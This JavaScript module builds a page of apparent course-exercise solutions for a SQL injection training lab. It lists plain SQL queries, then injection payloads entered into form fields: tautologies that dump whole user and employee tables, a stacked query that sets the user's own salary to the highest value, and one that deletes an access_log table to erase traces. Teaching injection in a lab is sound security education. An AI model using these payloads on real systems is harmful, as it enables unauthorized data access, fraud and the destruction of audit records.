export const createPage12A1 = ({

}) => {
  const article = document.createElement('article');

  const section = `
 
  <script src="/Style/prism.js"></script>
  <link rel="stylesheet" href="/Style/prism.css">
  <p>In dieser Aufgabe wurde auf ein Exploit eines ArrayWrapper hingewiesen, der in der Vorlesung präsentiert wurde.</p>
  <link rel="stylesheet" href="/Style/SummaryStyle.css">
  
    <details>
    <summary> Look at the example table. Try to retrieve the department of the employee Bob Franco. Note that you have been granted full administrator privileges in this assignment and can access all data without authentication.</summary>
    <pre>
		<code class="language-sql">
		select department from employees where first_name = 'Bob' And last_name='Franco' </code>
	</pre>
	</details>
  
	<details>
    <summary> Try to change the department of Tobi Barnett to 'Sales'. Note that you have been granted full administrator privileges in this assignment and can access all data without authentication.</summary>
    <pre>
		<code class="language-sql">
		update employees set department = 'Sales' where first_name = 'Tobi' and last_name = 'Barnett' </code>
	</pre>
	</details>

	<details>
    <summary> Now try to modify the schema by adding the column \"phone\" (varchar(20)) to the table \"employees\".</summary>
    <pre>
		<code class="language-sql">
		alter table employees add phone varchar(20)</code>
	</pre>
	</details>

	<details>
    <summary> Try to grant rights to the table grant_rights to user unauthorized_user</summary>
    <pre>
		<code class="language-sql">
		grant all on grant_rights to unauthorized_user </code>
	</pre>
	</details>

	<details>
    <summary> Try using the form below to retrieve all the users from the users table. You should not need to know any specific user name to get the complete list.</summary>
    <pre>
		<code class="language-sql">
		select * from user_data where first_name = 'John' and last_name = 'Smith' or '1' = '1' </code>
	</pre>
	</details>
	
	<details>
    <summary> Using the two Input Fields below, try to retrieve all the data from the users table.</summary>
    <pre>
		<code class="language-sql">
		\\"SELECT * FROM employees WHERE last_name = '\\" + Smith + \\"' AND auth_tan = '\\" + 3SL99A' or '1' = ' 1 + \\"'\\"; </code>
	</pre>
	<label> Login_Count: </label>
	<input type="text" value="100" disabled>
	<label> User_Id: </label>
	<input type="text" value="100 or true" disabled>
	</details>


	<details>
    <summary> Use the form below and try to retrieve all employee data from the employees table. You should not need to know any specific names or TANs to get the information you need. You already found out that the query performing your request looks like this\\n \\n  \\"SELECT * FROM employees WHERE last_name = '\\" + name + \\"' AND auth_tan = '\\" + auth_tan + \\"'\\";</summary>
    <pre>
		<code class="language-sql">
		\\"SELECT * FROM employees WHERE last_name = '\\" + Smith + \\"' AND auth_tan = '\\" + 3SL99A' or '1' = ' 1 + \\"'\\";</code>
	</pre>
	<label> Employee Name: </label>
	<input type="text" value="Smith" disabled>
	<label> Authentication TAN: </label>
	<input type="text" value="3SL99A' or '1' = ' 1" disabled>
	</details>

	<details>
    <summary> You just found out that Tobi and Bob both seem to earn more money than you! Of course you cannot leave it at that. \n Better go and change your own salary so you are earning the most!</summary>
    
	<label> Employee Name: </label>
	<input type="text" value="Smith" disabled>
	<label> Authentication TAN: </label>
	<input type="text" value="3SL99A'; update employees SET salary=(SELECT MAX(Salary)+1 FROM employees) where Last_Name='Smith" disabled style="width: 700px">
	</details>
	<details>
	<summary> Now you are the top earner in your company. But do you see that? There seems to be a access_log table, where all your actions have been logged to! \n Better go and delete it completely before anyone notices.</summary>
    
	<label> Action contains: </label>
	<input type="text" value="SELECT'; delete from access_log; SELECT * FROM access_log WHERE Action like '" disabled>
	</details>

`;

  article.insertAdjacentHTML('beforeend', section);

  return section;
};
